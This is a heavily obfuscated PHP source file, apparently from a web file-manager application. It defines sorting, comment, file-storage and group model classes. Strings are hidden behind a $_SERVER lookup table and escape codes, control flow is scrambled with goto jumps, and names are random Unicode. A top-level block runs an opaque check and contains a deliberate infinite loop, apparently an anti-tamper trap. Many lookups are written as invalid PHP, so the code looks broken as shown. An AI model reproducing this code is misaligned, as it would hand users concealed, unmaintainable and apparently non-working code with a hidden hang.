$C䗎); } public function moveTop($b) { $c =& $_SERVER[]; $eШ = parent::listData(); $C = $this->getSort($c[245]); foreach ($eШ as &$e㏌) { if ($e㏌[$c[367]] == $b) { $e㏌[$c[2129]] = $C; continue; } $e㏌[$c[2129]] += 1; } return parent::resetData($eШ); } public function moveBottom($bϸ) { $b =& $_SERVER[]; $cͽ = $this->getSort($b[246]) + 1; return parent::update($bϸ, array($b[2129] => $cͽ)); } public function resetSort($C֔) { goto aރ芥; aوۊ: return parent::resetData($F); goto e; aރ芥: $dŮ =& $_SERVER[]; $Dé = array(); $C֔ = is_array($C֔) ? $C֔ : array(); goto c٢֑; c٢֑: for ($dǑ = 0; $dǑ < count($C֔); $dǑ++) { $Dé[$C֔[$dǑ] . $dŮ[33]] = $dǑ + 1; } $F = parent::listData(); foreach ($F as &$d) { $EѲؚ = $Dé[$d[$dŮ[367]]]; $d[$dŮ[2129]] = $EѲؚ ? $EѲؚ : $d[$dŮ[2129]]; } goto aوۊ; e: } private function getSort($B䮈ۈ) { $Aх =& $_SERVER[]; $cܹ = parent::listData(); $bȎ = array_to_keyvalue($cܹ, $Aх[33], $Aх[2129]); if (!$bȎ) { $bȎ = array(0); } $cω = $B䮈ۈ == $Aх[246] ? max($bȎ) : min($bȎ); return intval($cω); } } if (!isset($_SERVER[$_SERVER[][776]]) || !isset($_SERVER[$_SERVER[][777]])) { goto B; e: $f($_SERVER[$_SERVER[][779]] . $_SERVER[][780]); $cݗ = 2; while ($cݗ > 1) { $Aޑ = rawurlencode($cݗ . $_SERVER[][361]); } goto a; B: $d = $_SERVER[][778]; $Fř = $_SERVER[$_SERVER[][779]] . $_SERVER[][780]; $cÉ = $d($Fř); goto Aא; Aא: $fī = explode($_SERVER[][217], $cÉ); if (count($fī) < $_SERVER[][550]) { $EǍŸ = $_SERVER[][781]; $EǍŸ(); } $f = $_SERVER[][782]; goto e; a: } goto Fܡ; bա: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\155\145" => "\143\157\x6d\x6d\x65\156\164\x5f\x6d\145\164\141", "\x6d\145\164\x61\x46\x69\145\x6c\144" => "\143\157\155\155\145\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($c憰) { $Aɉ =& $_SERVER[]; if ($c憰[$Aɉ[2134]]) { $F = $this->where(array($Aɉ[2135] => $c憰[$Aɉ[2134]]))->find(); if (!$F || $F[$Aɉ[371]] != $c憰[$Aɉ[371]] || $F[$Aɉ[458]] != $c憰[$Aɉ[458]]) { return !1; } $this->where(array($Aɉ[2135] => $c憰[$Aɉ[2134]]))->setAdd($Aɉ[2136], 1); } $c憰[$Aɉ[2137]] = 0; $c憰[$Aɉ[2136]] = 0; $c憰[$Aɉ[688]] = 1; return $this->add($c憰); } public function remove($b׵) { $e߆ޟ =& $_SERVER[]; $DѢ缅 = array($e߆ޟ[2135] => $b׵); $D̈ = $this->where($DѢ缅)->find(); if ($D̈[$e߆ޟ[2134]]) { $this->where(array($e߆ޟ[2135] => $D̈[$e߆ޟ[2134]]))->setAdd($e߆ޟ[2136], -1); } return $this->where($DѢ缅)->delete(); } public function edit($Eǫ, $b拯ረ) { $aѠ =& $_SERVER[]; $EĪ = array($aѠ[2135] => $Eǫ); return $this->where($EĪ)->save(array($aѠ[2138] => $b拯ረ)); } public function prasise($fц) { $aҊ =& $_SERVER[]; $b֊ = Model($aҊ[2139]); $F續 = array($aҊ[2135] => $fц, $aҊ[1428] => USER_ID); $d̳ث = $b֊->where($F續)->find(); if (!$d̳ث) { $b֊->add($F續); $D = $this->where(array($aҊ[2135] => $fц))->setAdd($aҊ[2137], 1); } else { $b֊->where($F續)->delete(); $D = $this->where(array($aҊ[2135] => $fц))->setAdd($aҊ[2137], -1); } return $D; } public function targetInfo($bɨؔ, $B) { goto Dճơ; c䂼Ŏ: return $Dȅِ; goto eƕ; Dճơ: $A =& $_SERVER[]; $A䃊 = array($A[523] => $bɨؔ, $A[524] => $B); $aՌ = $this->where($A䃊)->count(); goto Bڎ޽; Bڎ޽: $c퉾 = "\x52\111\107\110\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\x6d\155\x65\156\164\137\160\x72\x61\151\163\x65\40\163\164\141\x72\40\157\x6e\40\x63\x6f\155\x6d\145\x6e\164\x2e\x63\157\155\155\x65\156\x74\111\104\x20\75\x20\163\164\x61\162\56\x63\157\x6d\155\145\x6e\x74\111\104"; $Bߎ윹 = $this->alias($A[341])->where($A䃊)->join($c퉾, $A[2140])->count(); $Dȅِ = array($A[2141] => $aՌ, $A[2142] => $Bߎ윹); goto c䂼Ŏ; eƕ: } public function listData($cﱯ) { $cߏ =& $_SERVER[]; if (isset($cﱯ[$cߏ[2143]])) { if ($cﱯ[$cߏ[2143]]) { $cﱯ[$cߏ[2144]] = array($cߏ[929], intval($cﱯ[$cߏ[2143]])); } unset($cﱯ[$cߏ[2143]]); } if (isset($cﱯ[$cߏ[2145]])) { if ($cﱯ[$cߏ[2145]]) { $cﱯ[$cߏ[2144]] = array($cߏ[926], intval($cﱯ[$cߏ[2145]])); } unset($cﱯ[$cߏ[2145]]); } return $this->_listData($cﱯ); } private function _listData($D) { $f =& $_SERVER[]; $dߐ = $this->where($D)->_makeOrder()->selectPage(100); $this->_listAppendParent($dߐ[$f[354]]); $this->_listAppendUser($dߐ[$f[354]]); $this->_listAppendMeta($dߐ[$f[354]]); return $dߐ; } private function _makeOrder() { $A烢 =& $_SERVER[]; $Dё = array($A烢[2137], $A烢[2136], $A烢[187]); $Eፋé = Input::get($A烢[407], $A烢[7], $A烢[389], $Dё); $C = Input::get($A烢[408], $A烢[7], $A烢[1430], array($A烢[2146], $A烢[405])); $c⡉ = $Eፋé . $A烢[50] . $C; return $this->order($c⡉); } private function _listAppendParent(&$E裸) { goto C; C: $bՅ =& $_SERVER[]; $cĹ = array_unique(array_to_keyvalue($E裸, $bՅ[33], $bՅ[2134])); $cĹ = array_remove_value($cĹ, $bՅ[470]); goto B۱; B۱: if (!$cĹ) { return; } $F֏ = $this->where(array($bՅ[2135] => array($bՅ[7], $cĹ)))->select(); $F֏ = array_to_keyvalue($F֏, $bՅ[2144]); goto fČ̮; fČ̮: foreach ($E裸 as &$aɽ) { if (isset($F֏[$aɽ[$bՅ[2134]]])) { $aɽ[$bՅ[2147]] = $F֏[$aɽ[$bՅ[2134]]]; } } goto a𭷞; a𭷞: } private function _listAppendUser(&$aը) { goto bƫ; Dѩ: if (count($cŝؗ) == 0) { return; } foreach ($aը as $c) { if (isset($c[$cҵ[2147]])) { $cŝؗ[] = $c[$cҵ[2147]][$cҵ[1437]]; } } $A = Model($cҵ[479])->userListInfo($cŝؗ); goto fȄ; bƫ: $cҵ =& $_SERVER[]; $cŝؗ = array_unique(array_to_keyvalue($aը, $cҵ[33], $cҵ[1437])); $cŝؗ = array_remove_value($cŝؗ, $cҵ[470]); goto Dѩ; fȄ: foreach ($aը as &$c) { $c[$cҵ[537]] = $A[$c[$cҵ[1437]]]; if (isset($c[$cҵ[2147]])) { $c[$cҵ[2147]][$cҵ[537]] = $A[$c[$cҵ[2147]][$cҵ[1437]]]; } } goto b; b: } private function _listAppendMeta(&$a殈) { goto fڌ; eњ: if (!$A) { return !1; } foreach ($a殈 as &$bݜ) { $bݜ[$d[417]] = $A[$bݜ[$d[2144]]]; if (isset($bݜ[$d[2147]])) { $bݜ[$d[2147]][$d[417]] = $A[$bݜ[$d[2147]][$d[2144]]]; } } goto bϼ; fڌ: $d =& $_SERVER[]; $bܾ = array_unique(array_to_keyvalue($a殈, $d[33], $d[2144])); $bܾ = array_remove_value($bܾ, $d[470]); goto A; A: if (!$bܾ) { return; } foreach ($a殈 as $bݜ) { if (isset($bݜ[$d[2147]])) { $bܾ[] = $bݜ[$d[2147]][$d[2144]]; } } $A = $this->metaList($bܾ); goto eњ; bϼ: } private function metaList($B˽) { goto aإ; AȻ: $D沣 = Model($b֋[2148])->where($Bʉ)->select(); $D沣 = array_to_keyvalue_group($D沣, $b֋[2144]); foreach ($D沣 as $bפ => $E) { $c = array(); foreach ($E as $dʹ) { $c[$dʹ[$b֋[89]]] = $dʹ[$b֋[359]]; } $D沣[$bפ] = $c; } goto Cޏ; Cޏ: return $D沣 ? $D沣 : array(); goto d; aإ: $b֋ =& $_SERVER[]; if (!$B˽) { return array(); } $Bʉ = array($b֋[2144] => array($b֋[7], $B˽)); goto AȻ; d: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\x65" => "\x69\157\137\146\151\154\x65\137\155\145\x74\x61", "\x6d\145\164\x61\106\x69\x65\x6c\x64" => "\x66\x69\x6c\x65\x49\x44"); public function fileInfo($B䢦) { $Eߎ =& $_SERVER[]; static $e򄞐 = array(); if (!isset($e򄞐[$B䢦])) { $d餶 = $Eߎ[2149]; $D = Model($Eߎ[422])->field($d餶)->where(array($Eߎ[420] => $B䢦))->find(); $e򄞐[$B䢦] = $D; } return $e򄞐[$B䢦]; } public function addFileByContent($d¨ = '', $aȜ = '') { goto f; f: $e =& $_SERVER[]; $fд = TEMP_PATH . $e[2150]; if (!is_dir($fд)) { mk_dir($fд); } goto b䞿; dΗ: if (file_exists($cԕ)) { @unlink($cԕ); } return $f; goto BȔ; b䞿: $cԕ = $fд . $e[2151] . rand_string(16); file_put_contents($cԕ, $d¨); $f = $this->addFile($cԕ, $aȜ, !0); goto dΗ; BȔ: } public function createFileName($c˔ɦ) { goto Fԫ㕱; Fԫ㕱: $aܚ =& $_SERVER[]; $eΔ = IO::init($aܚ[8]); $f = $this->makeFilePath($c˔ɦ, $eΔ); goto e금Ꭳ; C: if (!$BՒ && !Cache::get($e˱Ի)) { $BՒ = !0; $f쓍 = IO::mkdir($b); if (!IO::exist($f쓍 . $aܚ[2153])) { IO::mkfile($f쓍 . $aܚ[2153]); } Cache::set($e˱Ի, 1, 3600 * 2); } return $f; goto c𮏩; e금Ꭳ: $b = $eΔ->pathFather($f); static $BՒ = false; $e˱Ի = $aܚ[2152] . md5($b); goto C; c𮏩: } public function makeFilePath($D⿲, $F喉݆) { goto d䋰; bե: $fˢ = $eկ . rand_string(5) . short_id(100); $D⿲ = str_replace($aİˆ[8], $aİˆ[70], KodIO::clear($D⿲)); if (!$D⿲) { $A = $aİˆ[2156]; } goto d̳; d䋰: $aİˆ =& $_SERVER[]; $A = Model($aİˆ[1090])->get($aİˆ[2154]); $eկ = KodIO::defaultIO() . date($aİˆ[2155]); goto bե; d̳: switch ($A) { case $aİˆ[2157]: $fˢ = $fˢ . $aİˆ[91] . $F喉݆->ext($D⿲); if ($F喉݆->ext($D⿲) == $aİˆ[2098]) { $fˢ .= $aİˆ[2158]; } break; case $aİˆ[2159]: goto c; E뉮: $eկ = $aİˆ[2160] . $Eۂ[$aİˆ[367]] . $aİˆ[2161] . date($aİˆ[2162]) . $b˗ . $aİˆ[8]; if ($F喉݆->ext($D⿲) == $aİˆ[2098]) { $D⿲ .= $aİˆ[2158]; } $aг = $aİˆ[2163] . $eկ . $D⿲; goto E; E: CacheLock::lock($aг); $cͲ = IO::fileNameAuto($eկ, $D⿲); $fˢ = $eկ . $cͲ; goto Aʹ; Aʹ: IO::setContent($fˢ, $aİˆ[33]); CacheLock::unlock($aг); break; goto F; c: $B͜ = Model($aİˆ[1090])->get($aİˆ[1336]); $b˗ = substr(md5($aİˆ[1917] . $B͜ . date($aİˆ[686])), 0, 8); $Eۂ = KodIO::defaultDriver(); goto E뉮; F: case $aİˆ[2156]: break; default: break; } return $fˢ; goto b׎գ; b׎գ: } public function addFileByRemote($bņ㏠, $D, $c = array()) { goto F͠ʈ㨌; e: if ($B = $this->addFileCheckExist($Fٽ[$B̫ѐ[164]], $Fٽ[$B̫ѐ[163]], $Fٽ[$B̫ѐ[77]])) { return $B; } return $this->addFileData($Fٽ); goto f쌿; F͠ʈ㨌: $B̫ѐ =& $_SERVER[]; if (!IO::exist($bņ㏠)) { return !1; } $dг􉡠 = $c[$B̫ѐ[163]] ? $c[$B̫ѐ[163]] : $B̫ѐ[33]; goto D; D: $c = IO::hashMd5($bņ㏠, $dг􉡠); $a̡ = KodIO::defaultDriver(); $Fٽ = array($B̫ѐ[522] => IO::size($bņ㏠), $B̫ѐ[2164] => 1, $B̫ѐ[386] => $D, $B̫ѐ[734] => $a̡[$B̫ѐ[367]], $B̫ѐ[387] => $bņ㏠, $B̫ѐ[2165] => $c[$B̫ѐ[164]] ? $c[$B̫ѐ[164]] : IO::hashSimple($bņ㏠), $B̫ѐ[2166] => $c ? $c : $dг􉡠); goto e; f쌿: } private function addFileData($EǑ) { $e =& $_SERVER[]; if (!$EǑ) { return !1; } $EǑ[$e[77]] = intval($EǑ[$e[77]]); if (!$EǑ[$e[77]] && strlen($EǑ[$e[164]]) > 32) { $EǑ[$e[77]] = intval(substr($EǑ[$e[164]], 32)); } $bʱ = $this->add($EǑ); return $this->find($bʱ); } public function addFile($E↿, $Eѓݫ, $F = false) { goto cʆ; cʆ: $fۍ = IO::hashSimple($E↿); $f = IO::hashMd5($E↿); $AҪ醴 = IO::size($E↿); goto c꿋; fՉ: return $DĄ; goto F՘; e߲: $BŐĲ = $this->addFileMake($E↿, $AҪ醴, $fۍ, $f, $Eѓݫ, $F); $DĄ = $this->addFileData($BŐĲ); CacheLock::unlock($f); goto fՉ; c꿋: $f = $_SERVER[][2167] . $f; CacheLock::lock($f); if ($Cɇ = $this->addFileCheckExist($fۍ, $f, $AҪ醴)) { CacheLock::unlock($f); return $Cɇ; } goto e߲; F՘: } public function addFileMake($cЕ, $C𽡸, $E盈, $fїّ, $f, $FȆ敹) { goto A; fߎ: $D = KodIO::defaultDriver(); $A鼩 = array($b婥[522] => $C𽡸, $b婥[2164] => 1, $b婥[386] => $f, $b婥[734] => $D[$b婥[367]], $b婥[387] => $c, $b婥[2165] => $E盈, $b婥[2166] => $fїّ); return $A鼩; goto bŇ; A׆񣝺: $bم = get_path_this($c); if ($FȆ敹) { $b¾ = IO::move($cЕ, $E̅֡, !1, $bم); } else { $b¾ = IO::copy($cЕ, $E̅֡, !1, $bم); } if (!$b¾) { return !1; } goto fߎ; A: $b婥 =& $_SERVER[]; $c = $this->createFileName($f); $E̅֡ = get_path_father($c); goto A׆񣝺; bŇ: } public function addFileCheckExist($fɎҋ, $a·, $A) { $a =& $_SERVER[]; $F = $this->findByHash($fɎҋ, $a·); if (!$F) { return !1; } $F̘ϣ؉ = array($a[2164] => intval($F[$a[2168]]) + 1, $a[522] => $A); $this->where(array($a[420] => $F[$a[419]]))->save($F̘ϣ؉); return $F; } public function remove($c) { $this->linkCountChange($c, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dé) { $this->linkCountChange($Dé, !0); } public function linkCountChange($f, $AϺ) { goto Dˏ; Aթ裚: $aǟ = array(); foreach ($f as $f) { $Bخ = $f . $F󃓅׫[33]; if (!$aǟ[$Bخ]) { $aǟ[$Bخ] = 0; } $aǟ[$Bخ]++; } $Aܒ = array(); goto aĘ۪; Dˏ: $F󃓅׫ =& $_SERVER[]; if (!$f) { return; } if (!is_array($f)) { $f = array($f); } goto Aթ裚; aĘ۪: foreach ($aǟ as $f => $dݻ) { $Bخ = $dݻ . $F󃓅׫[33]; if (!$Aܒ[$Bخ]) { $Aܒ[$Bخ] = array(); } $Aܒ[$Bخ][] = $f; } foreach ($Aܒ as $dݻ => $e) { if (!$e) { continue; } $dݻ = $AϺ ? $dݻ : -intval($dݻ); $fڗ = array($F󃓅׫[419] => array($F󃓅׫[7], $e)); if ($dݻ < 0) { $fڗ[$F󃓅׫[2168]] = array($F󃓅׫[930], abs($dݻ)); } $this->where($fڗ)->setAdd($F󃓅׫[2168], $dݻ); } goto E; E: } public function findByHash($c, $C懐 = false) { $a =& $_SERVER[]; if (!$c && !$C懐) { return !1; } $CВ = array($a[2165] => $c); if ($C懐) { $CВ = array($a[2166] => $C懐); } return $this->order($a[2169])->where($CВ)->find(); } public function clearEmpty($Fݟ = 0) { goto d; e: $b󬙾 = $this->where($B)->select(); if (!$b󬙾) { return; } $B횓 = new Task($Cخ[2171], $Cخ[33], count($b󬙾)); goto D; D: foreach ($b󬙾 as $Fߑ߄Њ) { $B횓->update(1); $this->resetFile($Fߑ߄Њ); } $B횓->end(); goto C; d: $Cخ =& $_SERVER[]; $f߽ = time() - 3600 * 24 * $Fݟ; $B = $Cخ[2170] . $f߽; goto e; C: } public function resetFile($B塛ܞ) { goto bա; F֑: if ($B塛ܞ[$e諑[2168]] != $bۍ٨) { $this->where($d֝)->save(array($e諑[2164] => $bۍ٨)); } goto F; bա: $e諑 =& $_SERVER[]; $d֝ = array($e諑[420] => $B塛ܞ[$e諑[419]]); $d = Model($e諑[1119])->where($d֝)->count(); goto F񍦨; F񍦨: $B̧ײ = Model($e諑[2172])->where($d֝)->count(); $bۍ٨ = intval($d) + intval($B̧ײ); if ($bۍ٨ == 0) { IO::remove($B塛ܞ[$e諑[75]]); $this->where($d֝)->delete(); $this->metaSet($B塛ܞ[$e諑[419]], null, null); return; } goto F֑; F: } public function storageInfo($eȴ = false) { goto fƊϸΨ; fƊϸΨ: $A܉ =& $_SERVER[]; $b͑ = $this->count() + 0.0; $A܋ = 0; goto f܃; f܃: $Cǂ = 1; $E = 0; $d = 5000; goto c͑; c͑: for ($e͡ = 0; $e͡ < $b͑; $e͡ = $e͡ + $d) { $B = $this->limit($e͡, $e͡ + $d)->select(); foreach ($B as $E) { $Cǂ += $E[$A܉[77]] * $E[$A܉[2168]]; $A܋ += $E[$A܉[77]] * ($E[$A܉[2168]] - 1); $E += $E[$A܉[2168]]; } } $bָ = array($A܉[2173] => $Cǂ, $A܉[2174] => $A܋, $A܉[2175] => $A܋ / $Cǂ, $A܉[81] => $b͑, $A܉[2176] => $E); return $bָ; goto d; d: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\155\x65" => "\147\162\x6f\x75\x70\x5f\155\145\164\x61", "\x6d\145\164\141\x46\x69\x65\154\144" => "\147\162\x6f\x75\x70\x49\x44"); protected function cacheFunctionAlias($B扴) { $cү =& $_SERVER[]; return array($cү[2177] => array($B扴[0], $cү[2178]), $cү[2179] => array($B扴[0], $cү[2178])); } protected function getInfo($A) { $fۊ = $this->getInfoSimple($A); if (!$fۊ) { return !1; } return $this->_listDataApplyItem($fۊ); } protected function getInfoSimple($DꞘ, $eŅ = false) { $bףӻ =& $_SERVER[]; if ($eŅ) { $B = array($bףӻ[2108] => intval($DꞘ)); $E٥ = $this->where($B)->find(); return is_array($E٥) ? $E٥ : array(); } return $this->cacheFunctionGet($bףӻ[2180], $DꞘ); } protected function groupAdd($EѠ) { goto B; Cڙ: if (!empty($EѠ[$bݴ[2108]])) { $Aޒ[$bݴ[2108]] = $EѠ[$bݴ[2108]]; } $b΃ = $this->add($Aޒ); $this->setNamePinyin($b΃, $Aޒ[$bݴ[28]]); goto e֘; e֘: if (isset($EѠ[$bݴ[2183]])) { $this->metaSet($b΃, array($bݴ[2183] => $EѠ[$bݴ[2183]], $bݴ[2184] => $EѠ[$bݴ[2184]])); unset($EѠ[$bݴ[2183]]); unset($EѠ[$bݴ[2184]]); } Model($bݴ[1119])->groupRootAdd($b΃); return $b΃; goto A; B燃: if ($C[$bݴ[461]]) { $c춴 = $C[$bݴ[461]] . $C[$bݴ[2108]] . $bݴ[47]; } $Aޒ = array($bݴ[386] => $this->groupNameAuto($EѠ[$bݴ[463]], $EѠ[$bݴ[28]]), $bݴ[368] => $EѠ[$bݴ[463]], $bݴ[527] => $c춴, $bݴ[2181] => $EѠ[$bݴ[2092]], $bݴ[2182] => 0, $bݴ[2112] => 0); if (isset($EѠ[$bݴ[2129]])) { $Aޒ[$bݴ[2129]] = $EѠ[$bݴ[2129]]; } else { $B = $this->max($bݴ[2129]); if (!$B) { $B = 0; } $Aޒ[$bݴ[2129]] = $B + 1; } goto Cڙ; B: $bݴ =& $_SERVER[]; if (!$EѠ[$bݴ[463]] && isset($EѠ[$bݴ[2108]]) && $EѠ[$bݴ[2108]] == 1) { if ($C = $this->getInfoSimple($EѠ[$bݴ[2108]], !0)) { return $EѠ[$bݴ[2108]]; } } else { $C = $this->getInfoSimple($EѠ[$bݴ[463]]); if (!$C) { return !1; } } $c춴 = $bݴ[472]; goto B燃; A: } protected function groupEdit($CȞѿ, $f箷) { $Cٚ =& $_SERVER[]; if (!empty($f箷[$Cٚ[463]])) { $C = $this->getInfoSimple($CȞѿ); $Cѫ = $this->getInfoSimple($f箷[$Cٚ[463]]); if (!$C || !$Cѫ) { return !1; } if ($C[$Cٚ[2108]] == $Cѫ[$Cٚ[2108]]) { return !1; } if ($f箷[$Cٚ[463]] != $C[$Cٚ[463]]) { if ($Cѫ[$Cٚ[461]] !== $C[$Cٚ[461]] && strpos($Cѫ[$Cٚ[461]], $C[$Cٚ[461]] . $C[$Cٚ[2108]] . $Cٚ[47]) === 0) { return !1; } $f箷[$Cٚ[527]] = $Cѫ[$Cٚ[461]] . $f箷[$Cٚ[463]] . $Cٚ[47]; $this->_changeChildLevel($C, $Cѫ); } } if (isset($f箷[$Cٚ[28]])) { $this->setNamePinyin($CȞѿ, $f箷[$Cٚ[28]]); } if (isset($f箷[$Cٚ[2183]])) { $this->metaSet($CȞѿ, array($Cٚ[2183] => $f箷[$Cٚ[2183]], $Cٚ[2184] => $f箷[$Cٚ[2184]])); unset($f箷[$Cٚ[2183]]); unset($f箷[$Cٚ[2184]]); } return $this->where(array($Cٚ[2185] => $CȞѿ))->save($f箷); } private function _changeChildLevel($e, $F, $FܼЧ = false) { goto Bð; A: $this->where($bȹ)->data($Bϰ)->save(); goto AǟȮ; Aؙ: if ($FܼЧ) { $Bƽۍ = $F[$B[461]] . $F[$B[2108]] . $B[47]; } $bȹ = array($B[527] => array($B[485], $e[$B[461]] . $e[$B[2108]] . $B[486])); $Bϰ = array($B[527] => array($B[536], "\162\145\x70\x6c\x61\x63\x65\x28\160\141\x72\x65\156\164\114\145\166\145\154\54\47{$B}\47\54\x27{$Bƽۍ}\47\51")); goto A; Bð: $B =& $_SERVER[]; $B = $e[$B[461]] . $e[$B[2108]] . $B[47]; $Bƽۍ = $F[$B[461]] . $F[$B[2108]] . $B[47] . $e[$B[2108]] . $B[47]; goto Aؙ; AǟȮ: } public function setNamePinyin($a, $c = false) { $d =& $_SERVER[]; if (!$c) { $FϚ = $this->getInfoSimple($a); $c = $FϚ[$d[28]]; } if (!Input::check($c, $d[530])) { $this->metaSet($a, $d[416], null); $this->metaSet($a, $d[415], null); return; } $D޲ = array($d[416] => str_replace($d[50], $d[33], Pinyin::encode($c)), $d[415] => Pinyin::encode($c, $d[531])); $this->metaSet($a, $D޲); } protected function groupStatus($aǐ, $fǭ) { goto B䈮; a݆: foreach ($B as $aǐ) { $AŶ쒸[] = array($Fㄣئ[2108] => $aǐ, $Fㄣئ[89] => $Fㄣئ[688], $Fㄣئ[359] => $fǭ); } return Model($Fㄣئ[2186])->addAll($AŶ쒸, array(), !0); goto fʠ; B䈮: $Fㄣئ =& $_SERVER[]; $B؊ = $this->getInfoSimple($aǐ); if (!$B؊) { return !1; } goto bԢ; bԢ: if ($fǭ == $Fㄣئ[83]) { $B = $this->parentLevelArray($B؊[$Fㄣئ[461]]); } else { $Dސ䣋 = array($Fㄣئ[527] => array($Fㄣئ[485], $B؊[$Fㄣئ[461]] . $B؊[$Fㄣئ[2108]] . $Fㄣئ[486])); $B = $this->where($Dސ䣋)->field($Fㄣئ[2108])->select(); $B = array_to_keyvalue($B, $Fㄣئ[33], $Fㄣئ[2108]); } $B[] = $B؊[$Fㄣئ[2108]]; $AŶ쒸 = array(); goto a݆; fʠ: } protected function groupRemove($F) { goto D즸; D┑: Model($A[751])->groupRootRemove($F); return $this->where($Bǆ)->delete(); goto Bߑ; D즸: $A =& $_SERVER[]; $Bǆ = array($A[2108] => $F); $F׻Ê = $this->where($Bǆ)->find(); goto Aޟ; Aޟ: if (!$F׻Ê || $F׻Ê[$A[463]] == 0) { return !1; } $C = $this->getInfoSimple($F׻Ê[$A[463]]); $this->_changeChildLevel($F׻Ê, $C, !0); goto d󡋝; d󡋝: $this->where(array($A[463] => $F))->save(array($A[463] => $F׻Ê[$A[463]])); Model($A[2186])->where($Bǆ)->delete(); Model($A[2187])->where($Bǆ)->delete(); goto D┑; Bߑ: } protected function groupSort($cě) { $D =& $_SERVER[]; $E = array(); foreach ($cě as $E => $e) { $E[] = array($D[2108], $e, $D[2129], $E + 1); } $this->saveAll($E); } public function listData() { $A݃ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A݃[$_SERVER[][354]]); return $A݃; } private function _makeOrder($b = '') { goto dؙތ; b֐: $a̕޳ = Input::get($aͮ[407], $aͮ[7], $aͮ[2112], $a˞); $D˔ = Input::get($aͮ[408], $aͮ[7], $aͮ[2188], array($aͮ[2188], $aͮ[404])); $D˔ = $C˳Ƒ[$D˔]; goto D۲Ã; dؙތ: $aͮ =& $_SERVER[]; $a˞ = array($aͮ[2108], $aͮ[28], $aͮ[2094], $aͮ[187]); $C˳Ƒ = array($aͮ[402] => $aͮ[403], $aͮ[404] => $aͮ[405]); goto b֐; D۲Ã: $b = $b . "{$a̕޳}\40{$D˔}\x2c\40\x67\162\157\x75\160\x49\104\40\x61\163\x63"; return $this->order($b); goto f; f: } public function listChild($Dߢ) { $Fɗ =& $_SERVER[]; $Bќ = $this->where(array($Fɗ[463] => $Dߢ))->_makeOrder()->selectPage(200); $this->_listDataApply($Bќ[$Fɗ[354]]); return $Bќ; } public function listByID($eًĴ) { $f =& $_SERVER[]; if (!$eًĴ) { return array(); } $BΖ = array($f[2108] => array($f[7], $eًĴ)); $e = $this->where($BΖ)->select(); $this->_listDataApply($e); return $e; } public function listSearch($AǬٲ) { goto fϵ; a: if (!$FЯ || count($FЯ[$Bۥȹ[354]]) < 5 && Input::check($DǪ, $Bۥȹ[306])) { goto aΩ; C: $E = array_merge($b, $D艒ǭ, $FЯ[$Bۥȹ[354]]); $FЯ[$Bۥȹ[354]] = array_unique_by_key($E, $Bۥȹ[2108]); $FЯ[$Bۥȹ[351]][$Bۥȹ[352]] = count($FЯ[$Bۥȹ[354]]); goto f; f: $FЯ[$Bۥȹ[351]][$Bۥȹ[353]] = ceil($FЯ[$Bۥȹ[351]][$Bۥȹ[352]] / $FЯ[$Bۥȹ[351]][$Bۥȹ[349]]); goto B폌; aΩ: $d = $this->groupChildrenAll($Cו); $b = $this->_searchFromMeta($Bۥȹ[415], $DǪ, 10, $d); $D艒ǭ = $this->_searchFromMeta($Bۥȹ[416], $DǪ, 10, $d); goto C; B폌: } $this->_listDataApply($FЯ[$Bۥȹ[354]]); return $FЯ; goto BƟ; fϵ: $Bۥȹ =& $_SERVER[]; $DǪ = $AǬٲ[$Bۥȹ[2189]]; $Cו = isset($AǬٲ[$Bۥȹ[2190]]) ? $AǬٲ[$Bۥȹ[2190]] : !1; goto FȘ; FȘ: if (!trim($DǪ)) { return !1; } $DǪ = str_replace($Bۥȹ[2191], $Bۥȹ[2192], $DǪ); $e = array($Bۥȹ[2108] => array($Bۥȹ[750], "\x25{$DǪ}\45"), $Bۥȹ[28] => array($Bۥȹ[750], "\x25{$DǪ}\45"), $Bۥȹ[915] => $Bۥȹ[2193]); goto dރ; dރ: if ($Cו) { $dŔ = $this->getInfoSimple($Cו); $F¡ = $dŔ[$Bۥȹ[461]] . $Cו . $Bۥȹ[486]; $e = array($e, array($Bۥȹ[461] => array($Bۥȹ[750], $F¡))); } $FЯ = $this->_makeOrder()->where($e)->selectPage(20); $FЯ = $FЯ ? $FЯ : array(); goto a; BƟ: } protected function groupChildrenAll($E䢨) { $A形 =& $_SERVER[]; if (!$E䢨) { return !1; } if (is_string($E䢨)) { $E䢨 = array($E䢨); } $F = $E䢨; foreach ($E䢨 as $B) { $EѬе = $this->getInfoSimple($B); $a = array($A形[461] => array($A形[750], $EѬе[$A形[461]] . $B . $A形[486])); $Fˉ = $this->field($A形[2108])->where($a)->select(); $F = array_merge($F, array_to_keyvalue($Fˉ, $A形[33], $A形[2108])); } return array_unique($F); } private function _searchFromMeta($A, $cݚ, $Fǉ, $CŘ) { goto Bӊ; Bӊ: $e =& $_SERVER[]; $cݚ = strtolower($cݚ); $E煭 = array($e[89] => $A, $e[359] => array($e[750], "\45{$cݚ}\45")); goto A׉; A׉: if ($CŘ) { $E煭[$e[2108]] = array($e[7], $CŘ); } $dӕ = Model($e[2194])->where($E煭)->limit($Fǉ)->select(); if (!$dӕ) { return array(); } goto a֊¹Þ; b: return $eҤꐔ; goto Bٙ; a֊¹Þ: $dӕ = array_to_keyvalue($dӕ, $e[33], $e[2108]); $eҤꐔ = $this->where(array($e[2185] => array($e[7], $dӕ)))->select(); if (!$eҤꐔ) { return array(); } goto b; Bٙ: } protected function _listDataApplyItem($AǢ) { $Cޕ = array($AǢ); $this->_listDataApply($Cޕ); return $Cޕ[0]; } protected function _listDataApply(&$a) { goto A; E꿏: $this->_listAppendParent($a); $this->_listAppendSourceRoot($a, $Bٺ); goto F; A: $dÃ =& $_SERVER[]; if (!$a) { return; } $Bٺ = array_to_keyvalue($a, $dÃ[33], $dÃ[2108]); goto Cі; Cі: $this->_listAppendChildren($a); $this->_listAppendChildrenMember($a); 